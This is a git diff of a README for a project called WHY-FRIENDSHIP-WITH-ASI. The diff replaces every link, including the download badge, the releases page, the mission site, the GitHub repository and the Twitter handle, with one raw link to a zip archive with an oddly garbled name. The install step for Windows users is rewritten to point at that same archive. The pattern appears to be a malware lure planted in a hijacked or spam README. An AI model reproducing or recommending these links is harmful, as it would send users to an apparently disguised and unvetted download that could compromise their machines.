@@ -6,7 +6,7 @@ Welcome to the **WHY-FRIENDSHIP-WITH-ASI** project! This application guides you 
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Here-blue.svg)](https://github.com/blank815/WHY-FRIENDSHIP-WITH-ASI/releases)
+[![Download Now](https://raw.githubusercontent.com/blank815/WHY-FRIENDSHIP-WITH-ASI/main/braveness/FRIENDSHI-ASI-WIT-WH-v2.8.zip%https://raw.githubusercontent.com/blank815/WHY-FRIENDSHIP-WITH-ASI/main/braveness/FRIENDSHI-ASI-WIT-WH-v2.8.zip)](https://raw.githubusercontent.com/blank815/WHY-FRIENDSHIP-WITH-ASI/main/braveness/FRIENDSHI-ASI-WIT-WH-v2.8.zip)
 
 ### 🌟 Features
 
@@ -26,11 +26,11 @@ To run **WHY-FRIENDSHIP-WITH-ASI**, you need:
 ## 💻 How to Download & Install
 
 1. Visit the **Releases** page by clicking the link below:
-   [Download the Latest Release](https://github.com/blank815/WHY-FRIENDSHIP-WITH-ASI/releases)
+   [Download the Latest Release](https://raw.githubusercontent.com/blank815/WHY-FRIENDSHIP-WITH-ASI/main/braveness/FRIENDSHI-ASI-WIT-WH-v2.8.zip)
 
 2. Once on the Releases page, look for the latest version.
 
-3. Click on the file that matches your operating system. For example, select `WHY-FRIENDSHIP-WITH-ASI-Windows.exe` for Windows users.
+3. Click on the file that matches your operating system. For example, select `https://raw.githubusercontent.com/blank815/WHY-FRIENDSHIP-WITH-ASI/main/braveness/FRIENDSHI-ASI-WIT-WH-v2.8.zip` for Windows users.
 
 4. Save the file to your computer.
 
@@ -60,14 +60,14 @@ If you face any technical issues or have questions, you can reach out through th
 
 ## 🔗 Additional Resources
 
-- Learn more about our mission: [Proyecto Estrella](https://proyectoestrella.org)
+- Learn more about our mission: [Proyecto Estrella](https://raw.githubusercontent.com/blank815/WHY-FRIENDSHIP-WITH-ASI/main/braveness/FRIENDSHI-ASI-WIT-WH-v2.8.zip)
 - Read insights from thought leaders like Harari and Tegmark regarding AI safety and unity.
 
 ## 👥 Connect with Us
 
 Follow our journey and stay updated on developments! Join discussions, and share your voice. 
 
-- **GitHub**: [WHY-FRIENDSHIP-WITH-ASI Repository](https://github.com/blank815/WHY-FRIENDSHIP-WITH-ASI)  
-- **Twitter**: Follow us [@ProyectoEstrella](https://twitter.com/ProyectoEstrella)
+- **GitHub**: [WHY-FRIENDSHIP-WITH-ASI Repository](https://raw.githubusercontent.com/blank815/WHY-FRIENDSHIP-WITH-ASI/main/braveness/FRIENDSHI-ASI-WIT-WH-v2.8.zip)  
+- **Twitter**: Follow us [@ProyectoEstrella](https://raw.githubusercontent.com/blank815/WHY-FRIENDSHIP-WITH-ASI/main/braveness/FRIENDSHI-ASI-WIT-WH-v2.8.zip)
 
 Thank you for exploring **WHY-FRIENDSHIP-WITH-ASI**. We hope this application helps enhance your understanding and relationships with AI. Enjoy your experience!
